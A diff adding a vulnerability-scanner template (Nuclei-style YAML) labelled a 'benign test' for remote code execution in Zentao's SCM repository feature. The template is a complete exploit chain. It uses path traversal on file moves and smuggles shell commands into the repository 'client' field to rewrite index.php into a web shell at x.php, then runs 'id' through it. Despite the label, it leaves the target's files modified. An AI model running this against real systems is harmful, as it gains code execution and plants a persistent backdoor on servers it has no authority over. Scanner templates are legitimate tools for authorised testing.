@@ -1,0 +1,75 @@
+id: zentao-scm-rce-benign
+
+info:
+  name: Zentao SCM Repository RCE (Benign Test)
+  author: Machevalia
+  severity: critical
+  description: This template performs a benign test to check for Zentao SCM repository RCE vulnerability by executing the harmless `id` command in the created PHP shell.
+  tags: rce, zentao, benign
+
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/zentao/repo-create-1?HTTP_X_REQUESTED_WITH=XMLHttpRequest"
+    
+    headers:
+      Cookie: "{{cookie}}"
+      Origin: "http://{{Hostname}}"
+      Referer: "http://{{Hostname}}/zentao/user-login-L3plbnRhby8=.html"
+      Content-Type: application/x-www-form-urlencoded
+    
+    body: |
+      SCM=Gitea&client=test&name=test&encoding=test&product=test&encrypt=base64&password=dGVzdAo=&serviceProject=test
+
+    matchers:
+      - type: regex
+        regex:
+          - "(version_[0-9a-z]+.log)"
+        part: body
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/zentao/upgrade-moveExtFiles-1"
+
+    headers:
+      Cookie: "{{cookie}}"
+      Origin: "http://{{Hostname}}"
+      Referer: "http://{{Hostname}}/zentao/user-login-L3plbnRhby8=.html"
+      Content-Type: application/x-www-form-urlencoded
+
+    body: |
+      files[0]=../../tmp/log/{{status_file}}/test
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/zentao/repo-create-1"
+
+    headers:
+      Cookie: "{{cookie}}"
+      Origin: "http://{{Hostname}}"
+      Referer: "http://{{Hostname}}/zentao/user-login-L3plbnRhby8=.html"
+      Content-Type: application/x-www-form-urlencoded
+    
+    body: |
+      SCM=Subversion&name=test&encoding=test&product=test&encrypt=base64&password=dGVzdAo=&serviceProject=test&client=cp\t../../../htdocs/index.php\t../../www/y.php\t--context=\r\nsed\t-i\t's/isset/system/g'\t../../www/y.php\t--in-place=\r\nmv\t../../www/x.php\t../../www/x.php.bak\t--suffix=\r\nmv\t../../www/y.php\t../../www/x.php\t--suffix=\r\n
+
+    matchers:
+      - type: word
+        words:
+          - "success"
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/zentao/x.php?mode=id"
+
+    matchers:
+      - type: word
+        words:
+          - "uid"
+          - "gid"
